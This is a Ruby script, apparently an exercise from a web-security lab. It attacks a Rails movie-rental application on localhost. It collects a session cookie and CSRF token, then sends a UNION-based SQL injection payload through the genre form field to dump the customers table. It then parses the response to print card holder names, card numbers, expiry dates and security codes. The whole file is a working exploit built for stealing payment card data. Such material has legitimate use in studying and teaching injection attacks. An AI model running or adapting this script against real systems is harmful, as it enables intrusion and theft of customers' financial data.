require 'socket'
require 'cgi'

# Initial visit to get session and authenticity_token
http = Array.new
http << "GET /movies/selectGenre HTTP/1.1"
http << "Host: localhost:3000"
http << "Connection: close"

request = http.join("\r\n") + "\r\n\r\n"
socket = TCPSocket.open("localhost", 3000)
socket.puts (request)

response = socket.read
socket.close

# Get session and authenticity_token from the response
session = /Cookie: _session_id=[A-Z a-z 0-9]*/.match(response)
token = /authenticity_token" type="hidden" value=".*=" /.match(response)
token = token.to_s.sub('authenticity_token" type="hidden" value="','').sub('="','')
token = "authenticity_token=" + CGI::escape(token.strip) + "%3D"

# Attacking visit
http = Array.new
good = "All"
attack = "' union select c.exp_month, c.name, c.card_number, c.exp_year, c.security_code, c.billing_city, c.billing_state from customers as c where '1' = '1"
body = "utf8=%E2%9C%93&"+token + "&genre="+attack+"&commit=Show+Movies"
http << "POST /movies/showGenre HTTP/1.1"
http << "Host: localhost:3000"
http << "Connection: close"
http << "Content-Type: application/x-www-form-urlencoded"
http << "Content-Length: "+body.length.to_s
http << session

request = http.join("\r\n") + "\r\n\r\n"
request = request + body
socket = TCPSocket.open("localhost", 3000)
socket.puts (request)

response = socket.read
socket.close

# Parse the response the get the credit card info
monthA = response.scan(/<a href="\/movies\/rent\/[0-9]*">/)
months = Array.new
monthA.each do |m|
	months << m.to_s.sub('<a href="/movies/rent/', '').sub('">','')
end

nameTd = response.scan(/">.*<\/a><\/td>/)
names = Array.new
nameTd.each do |n|
	names << n.to_s.sub('">', '').sub('</a></td>', '')
end

numTd = response.scan(/<td>[0-9]*<\/td>/)
nums = Array.new
numTd.each do |n|
	nums << n.to_s.sub('<td>', '').sub('</td>', '')
end

# Print the credit info
puts "Card Holder Name".ljust(18, ' ') + "    " + "Card Number".ljust(16, ' ') + "    " + "Expiration" + "   " + "Security Code"
index = 0
names.each do |name|
	puts name.ljust(18, ' ') + "    " + nums[3*index] + "    " + months[index].rjust(2, '0') + "/" + nums[3*index+1] +"      " + nums[3*index+2]
	index += 1
end




